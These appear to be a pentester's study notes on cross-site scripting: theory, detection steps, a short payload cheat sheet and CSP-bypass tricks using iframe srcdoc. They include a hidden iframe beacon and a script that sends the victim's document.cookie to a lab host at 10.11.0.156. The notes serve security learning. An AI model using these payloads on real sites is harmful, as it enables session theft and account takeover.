XSS

## Theory

- Reflected : Input from a user is directly returned to the browser, permittint injection of arbitrary content
- Stored : Input from a user is stored on the server (often in a database) and returned later without proper escaping
- DOM : Input from a user inserted into the page's DOM without proper handling, enabling insertion of arbitrary code.


---

## Recognition

1. Figure out where it goes. Does it get embedded in a tag attribute ? into a string in a script tag ?
2. Figure out any special handling : Do URLs get turned into links ?
3. Figure out how special characters are handled : Try these ```'<>:;"'

- From those 3 steps, you'll know whether or not a givin input is vulnerable to XSS.
r(reflected)XSS are dependent on CSRF vulnerabilities to be exploitable, in the case of POST. If rXSS in GET, you are dependent on CSRF otherwise.

- Example 1 : Testing character, angle brackets ```<>``` are passed through without encoding
and text is shown in a text node of the document. Here a simple ```<script>alert("XSS");</script>``` will work.

- Example 2 : THe input is reflected in a tag attribute. You have to break out of the attribute, but in most cases you don't need to leave the tag; meaning no need for angle brackets.
- 


---

## Short cheat sheet 

```
"><h1>test</h1>"
'+alert(1)+'
"onmouseover="alert(1)
http://"onmouseover="alert(1)
```
If one of these work, you just have to find the good one !

Complete cheat sheet : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
https://owasp.org/www-community/xss-filter-evasion-cheatsheet

---


## With an iframe , it's possible to get same result but in a stealthier manner :

```<iframe SRC="http://10.11.0.156:81/report" height = “0” width = “0”></iframe>```


---

## Steal the cookies :

```<script>new Image().src="http://10.11.0.156:4441/bogus.php?output="+document.cookie;</script>```

---

## TOOL TO TEST 

https://github.com/Damian89/extended-xss-search

---

## Check how it is reflected

- Any weird character ? Encoded ? Double encoded ? 


---

## Bypass CSP

- Check the header content-security-policy (burp or dev tools)
- Copy paste the url or the header into https://csp-evaluator.withgoogle.com/
- Don't bother with the warning about object-src, too old thing.


### default-src 

- means that it will only execute javascript from the server. So here, use the javascript at your disposal from the server.

-  To solve it : according to the documentation, the srcdoc attribute overrides the src attribute and specifies the HTML content to show inside the iframe. But most importantly, the iframe with the srcdoc attribute is not cross domain, meaning that the content will be treated as coming from the same domain as the parent-page. 

```<iframe srcdoc="<script src=...></script>"></iframe>```

Example from the intigriti easter xss challenge : ```<iframe srcdoc="<script src=https://challenge.intigriti.io/'-alert(document.domain)-'></script>"></iframe>```

### Resources :
https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/
https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2019/april/a-novel-csp-bypass-using-data-uri/

